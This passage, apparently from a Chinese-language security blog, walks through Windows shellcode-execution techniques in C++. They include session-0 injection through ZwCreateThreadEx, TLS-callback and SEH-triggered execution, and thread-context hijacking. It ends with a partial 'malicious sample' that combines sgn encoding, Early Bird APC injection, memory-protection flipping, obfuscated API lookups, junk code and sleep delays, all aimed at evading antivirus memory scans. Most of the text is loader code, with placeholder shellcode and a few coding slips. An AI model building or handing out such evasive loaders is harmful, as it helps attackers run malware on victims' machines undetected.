无法直接向系统进程内注入 shellcode 或者 dll，原因是 R3 的 CreateRemoteThread 在 R0 中的函数原型 ZwCreateThreadEx 在内部调用时会将第七个参数设为 1 导致会使新创建的线程处于挂起状态，所以我们的恶意 shellcode 无法被执行，只需要将第七个参数置 0 即可绕过。<br />\n注入流程：<br />\n1、利用函数原型自定义 ZwCreateThreadEx 函数<br />\n 2、通过系统获取 ntdll.dll 并加载 ZwCreateThreadEx 函数<br />\n 3、申请一块内存空间并将 shellcode 写入<br />\n 4、利用 ZwCreateThreadEx 将 shellcode 注入到系统进程中，将第七个参数置 0</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _WIN64</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">DWORD</span><span class=\"params\">(WINAPI* typedef_ZwCreateThreadEx)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    PHANDLE ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID ObjectAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    HANDLE ProcessHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID lpParameter,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ULONG CreateThreadFlags,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    SIZE_T ZeroBits,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    SIZE_T StackSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    SIZE_T MaximumStackSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID pUnkown)</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">DWORD</span><span class=\"params\">(WINAPI* typedef_ZwCreateThreadEx)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    PHANDLE ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID ObjectAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    HANDLE ProcessHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID lpParameter,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    BOOL CreateSuspended,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DWORD dwStackSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DWORD dw1,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DWORD dw2,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID pUnkown)</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"comment\">//char DllPath[] = &quot;C:\\\\Users\\\\Black Sheep\\\\source\\\\repos\\\\sesion0\\\\x64\\\\Debug\\\\TestDll.dll&quot;;</span></span><br><span class=\"line\">      <span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;   <span class=\"comment\">//shellcode</span></span><br><span class=\"line\">     HANDLE hRemoteThread;</span><br><span class=\"line\">    HANDLE hNtModule = <span class=\"built_in\">GetModuleHandleA</span>(<span class=\"string\">&quot;ntdll.dll&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class=\"built_in\">GetProcAddress</span>(hNtModule, <span class=\"string\">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class=\"number\">1516</span>(系统进程pid));</span><br><span class=\"line\">    LPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">VirtualAllocEx</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">     <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"built_in\">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class=\"literal\">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">   </span><br><span class=\"line\">       <span class=\"built_in\">CloseHandle</span>(hRemoteThread);</span><br><span class=\"line\">        <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">          <span class=\"built_in\">FreeLibrary</span>(hNtModule);</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><em><strong>TLS Code Execute (TLS 代码执行)</strong></em><br />\n 线程局部存储（Thread Local Storage，TLS）用来将数据与一个正在执行的指定线程关联起来，其提供了回调函数因此可以利用该函数达到执行 shellcode 的效果，主要编写的是 Reason 其规定和 dll 调用时一样<strong> DLL_PROCESS_ATTACH</strong></p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;  <span class=\"comment\">//shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">VOID NTAPI <span class=\"built_in\">TlsCallBack</span>(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class=\"line\"><span class=\"comment\">//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//写执行函数，也可以利用其他手段进行shellcode注入</span></span><br><span class=\"line\">        ((<span class=\"built_in\">void</span>(WINAPI*)(<span class=\"type\">void</span>)) &amp; shellcode)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment (linker, <span class=\"string\">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment (linker, <span class=\"string\">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> data_seg (<span class=\"string\">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class=\"line\"><span class=\"comment\">//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识</span></span><br><span class=\"line\"><span class=\"comment\">//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，</span></span><br><span class=\"line\"><span class=\"comment\">//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。</span></span><br><span class=\"line\">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> data_seg ()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 只是一种执行手段，依然可以配合其他手段组合。</p>\n<p><em><strong>SEH Code Execute (SEH 异常处理代码执行)</strong></em><br />\n SEH (Structured Exception Handling) 结构化异常处理，是 windows 操作系统默认的错误处理机制，通过主动抛出异常然后将恶意代码插入即可触发，可用于反调试。</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> b = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ExceptFilter</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    b = <span class=\"number\">1</span>;</span><br><span class=\"line\">    ((<span class=\"built_in\">void</span>(*NTAPI)(<span class=\"type\">void</span>)) &amp; shellcode)();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class=\"comment\">//返回出错位置重新执行</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    _try</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> c = a / b;  <span class=\"comment\">//只要能触发异常即可</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    _except(<span class=\"built_in\">ExceptFilter</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 需要主动触发异常，当然可以填充大量代码将触发异常的代码写的很隐蔽，还可以做到反调试的效果，也需要配合其他手段食用。</p>\n<p><em><strong>SetContext Hijack Thread (线程上下文环境劫持)</strong></em><br />\n 简单理解就是劫持线程的上下文环境，然后强行将 eip/rip 指向 shellcode 并执行。<br />\n劫持流程：<br />\n1、创建一个挂起的合法进程<br />\n 2、将恶意 shellcode 写入该进程<br />\n 3、将 eip/rip 指向该地址<br />\n 4、恢复线程</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    STARTUPINFOA si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    si.cb = <span class=\"built_in\">sizeof</span>(si);</span><br><span class=\"line\"></span><br><span class=\"line\">    PROCESS_INFORMATION pi = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">     <span class=\"built_in\">CreateProcessA</span>(<span class=\"literal\">NULL</span>, (LPSTR)<span class=\"string\">&quot;notepad&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, FALSE, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;si, &amp;pi);</span><br><span class=\"line\">     <span class=\"built_in\">SuspendThread</span>(pi.hThread);</span><br><span class=\"line\">     LPVOID lpBuffer = <span class=\"built_in\">VirtualAllocEx</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"built_in\">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">     <span class=\"built_in\">WriteProcessMemory</span>(pi.hProcess, lpBuffer, shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">     </span><br><span class=\"line\">     CONTEXT ctx = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">     ctx.ContextFlags = CONTEXT_ALL;</span><br><span class=\"line\">     <span class=\"built_in\">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class=\"line\">     ctx.Rip = (DWORD64)lpBuffer;</span><br><span class=\"line\">     <span class=\"built_in\">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class=\"line\">     <span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"本地测试效果和其他手法演示\"><a class=\"anchor\" href=\"#本地测试效果和其他手法演示\">#</a> 本地测试效果和其他手法演示</h4>\n<p>本次编写的恶意样本手法组合为：sgn + Early Bird + RW/RX/NOA 转换 + 自写 Win32API + junkCode 填充 + Sleep (15000)(循环真睡眠) 规避主动内存扫描<br />\n主要代码：<br />\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker,<span class=\"string\">&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> fish[<span class=\"number\">307910</span>] = &#123;......&#125;   <span class=\"comment\">//sgn后的shellcode</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* text_path = <span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* CreateP = <span class=\"string\">&quot;CreateProcessA&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* VirPro = <span class=\"string\">&quot;VirtualProtect&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* VirAloc = <span class=\"string\">&quot;VirtualAllocEx&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* WriteMem = <span class=\"string\">&quot;WriteProcessMemory&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* QueAPC = <span class=\"string\">&quot;QueueUserAPC&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">BOOL</span><span class=\"params\">(WINAPI* pCreateProcessA)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPCSTR                lpApplicationName,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSTR                 lpCommandLine,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tBOOL                  bInheritHandles,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD                 dwCreationFlags,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID                lpEnvironment,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPCSTR                lpCurrentDirectory,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">LPVOID</span><span class=\"params\">(WINAPI* pVirtualAllocEx)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tHANDLE hProcess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID lpAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T dwSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD  flAllocationType,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD  flProtect</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">BOOL</span><span class=\"params\">(WINAPI* pVirtualProtect)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID lpAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T dwSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD  flNewProtect,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tPDWORD lpflOldProtect</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">BOOL</span><span class=\"params\">(WINAPI* pWriteProcessMemory)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tHANDLE  hProcess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID  lpBaseAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPCVOID lpBuffer,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T  nSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">DWORD</span><span class=\"params\">(WINAPI* pQueueUserAPC)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tPAPCFUNC  pfnAPC,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tHANDLE    hThread,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tULONG_PTR dwData</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">GoHere</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\tSTARTUPINFO si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tPROCESS_INFORMATION pi = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tsi.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHMODULE hKernel32 = <span class=\"built_in\">GetModuleHandleW</span>(<span class=\"string\">L&quot;kernel32.dll&quot;</span>);</span><br><span class=\"line\">\tpCreateProcessA MyCreateProcess = (pCreateProcessA)<span class=\"built_in\">GetProcAddress</span>(hKernel32, CreateP);</span><br><span class=\"line\">\tpVirtualAllocEx MyVirtualAlloc = (pVirtualAllocEx)<span class=\"built_in\">GetProcAddress</span>(hKernel32, VirAloc);</span><br><span class=\"line\">\tpVirtualProtect MyVirProtect = (pVirtualProtect)<span class=\"built_in\">GetProcAddress</span>(hKernel32, VirPro);</span><br><span class=\"line\">\tpWriteProcessMemory MyWriteMen = (pWriteProcessMemory)<span class=\"built_in\">GetProcAddress</span>(hKernel32, WriteMem);</span><br><span class=\"line\">\tpQueueUserAPC MyQueueAPC = (pQueueUserAPC)<span class=\"built_in\">GetProcAddress</span>(hKernel32, QueAPC);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">MyCreateProcess</span>(text_path, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class=\"line\">\tLPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">MyVirtualAlloc</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X400200</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD oldProtect;</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">986</span>; i++);</span><br><span 